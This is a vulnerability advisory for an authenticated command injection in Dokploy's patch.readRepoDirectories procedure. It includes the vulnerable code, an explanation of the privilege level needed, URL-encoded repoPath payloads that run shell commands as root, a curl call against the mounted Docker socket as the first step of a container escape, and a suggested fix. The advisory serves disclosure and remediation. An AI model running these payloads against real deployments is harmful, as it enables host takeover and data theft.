repo.description: ### Summary The `patch.readRepoDirectories` tRPC procedure passes the user-controlled `repoPath` parameter directly into a shell command without any sanitization. An authenticated low-privilege organization member (not admin/owner) can inject arbitrary OS commands that execute as root inside the Dokploy container. Because the container mounts the host Docker socket (`/var/run/docker.sock`), this escalates to full host compromise. ### Details Vulnerable sink: `packages/server/src/services/patch-repo.ts`: ```ts export const readPatchRepoDirectory = async (repoPath: string, serverId?: string | null) => { // user-controlled repoPath interpolated directly into a shell string const command = `cd "${repoPath}" && git ls-tree -r --name-only HEAD`; ... const result = await execAsync(command); // child_process.exec -> /bin/sh -c ... }; ``` Entry point: `apps/dokploy/server/api/routers/patch.ts`: ```ts readRepoDirectories: protectedProcedure .input(z.object({ id: z.string().min(1), type: z.enum(["application", "compose"]), repoPath: z.string(), // <-- no validation / sanitization })) .query(async ({ input, ctx }) => { await checkServicePermissionAndAccess(ctx, input.id, { service: ["read"] }); ... return await readPatchRepoDirectory(input.repoPath, serverId); }), ``` `repoPath` is a bare `z.string()` and is never validated. `execAsync` is a thin wrapper over Node's `child_process.exec`, which runs the string through `/bin/sh -c`, so any shell metacharacter in `repoPath` is interpreted. The only authorization gate is `checkServicePermissionAndAccess(..., { service: ["read"] })`. The default `memberRole` already grants `service: ["read"]` (see `packages/server/src/lib/access-control.ts`), so any member who has access to at least one service can reach this sink. Note that `input.id` is used only to resolve `serverId`; it has no relation to `repoPath`. The sibling procedure `patch.readRepoFile` (~line 171, `cat "${fullPath}"` where `fullPath` is built from a user-controlled `filePath` via `path.join`) is reachable with the same privilege level and is vulnerable to path traversal and command injection as well. ### PoC Tested against a clean v0.29.8 Docker deployment, using a low-privilege member account (org role = `member`, permissions limited to `service:read` plus access to a single application; `member.*`, `organization.*`, `project.create` all `false`). 1. Authenticate as the member (better-auth requires an `Origin` header): 2. Discover an `applicationId` the member can access: applicationId is OjwLF2dQrqG6CNJ9noVEf 3. Trigger the injection. The `repoPath` payload closes the `cd "..."` quote, runs arbitrary commands (stdout redirected to stderr so the output is returned in the tRPC error message), then reopens the quote: ``` URL_ENCODE<{"0":{"json":{"id":"","type":"application","repoPath":"\"; { id ; } >&2; echo \""}}}> ``` Request: GET /api/trpc/patch.readRepoDirectories?batch=1&input={"0"%3a{"json"%3a{"id"%3a"OjwLF2dQrqG6CNJ9noVEf","type"%3a"application","repoPath"%3a"\"%3b+{+id+%3b+}+>%262%3b+echo+\""}}} **Container escape via the mounted Docker socket:** ``` URL_ENCODE<{"0":{"json":{"id":"OjwLF2dQrqG6CNJ9noVEf","type":"application","repoPath":"\"; { curl -s --unix-socket /var/run/docker.sock http://localhost/version ; } >&2; echo \""}}}> ``` Request: GET /api/trpc/patch.readRepoDirectories?batch=1&input={"0"%3a{"json"%3a{"id"%3a"OjwLF2dQrqG6CNJ9noVEf","type"%3a"application","repoPath"%3a"\"%3b+{+curl+-s+--unix-socket+/var/run/docker.sock+http%3a//localhost/version+%3b+}+>%262%3b+echo+\""}}} From here an attacker can create a privileged container that bind-mounts the host filesystem (`/:/host`) via the Docker socket, achieving full host takeover. ### Impact - Type: OS Command Injection (CWE-78) leading to Remote Code Execution. - Privilege required: any authenticated organization **member** with read access to a single service - no admin/owner role needed. - Execution context: commands run as `uid=0(root)` inside the Dokploy container. - Escalation: the host Docker socket is reachable, enabling container escape and full compromise of the Dokploy host and every application/database it manages. ### Suggested fix - Do not interpolate user input into a shell string. Invoke git with an argument array, e.g. `execFile("git", ["-C", resolvedPath, "ls-tree", "-r", "--name-only", "HEAD"])`. - Resolve and confine the path before use: ```ts const resolved = path.resolve(repoBase, repoPath); if (resolved !== repoBase && !resolved.startsWith(repoBase + path.sep)) { throw new Error("Invalid path"); } ``` - Apply a strict allowlist to `repoPath` / `filePath` (reject `..` and shell metacharacters). Apply the same fix to `patch.readRepoFile`.
repo.summary: Authenticated OS Command Injection in patch.readRepoDirectories (repoPath) leads to RCE as root
